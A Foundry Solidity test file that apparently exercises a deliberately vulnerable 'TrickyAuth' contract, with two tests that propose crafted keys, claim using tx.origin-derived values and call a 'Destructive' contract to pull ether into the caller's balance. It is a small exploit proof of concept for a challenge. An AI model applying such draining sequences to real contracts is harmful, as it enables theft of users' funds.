// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {TrickyAuth, Destructive} from "../src/TrickyAuth.sol";

contract CounterTest is Test {
    TrickyAuth public CT;

    function setUp() public {
        CT = new TrickyAuth{value: 0x1000000000000000}();
    }

    function testWorks() public {
        uint256 pre = tx.origin.balance;

        CT.proposeKey(0x0000000000000000000000000000000000000000000000000000000000000001);
        CT.claim(bytes32(uint256(uint160(tx.origin))));
        Destructive(0x1D3A4032B521e09a91555d2630E19e259Cca3aF6).claim();

        assertGe(tx.origin.balance, pre + 0x0100000000000000);
    }
    function testWorksOk() public {
        uint256 pre = tx.origin.balance;

        CT.proposeKey(0x0000000000000000000000000000000000000000000000000000000000000017);
        CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), bytes32(0x0000000000000000000000000000000000000000000000000000000000000017))));
        CT.claim(0x0000000000000000000000000000000000000000000000000000000000000017);
        Destructive(0x1D3A4032B521e09a91555d2630E19e259Cca3aF6).claim();

        assertGe(tx.origin.balance, pre + 0x0100000000000000);
    }
}
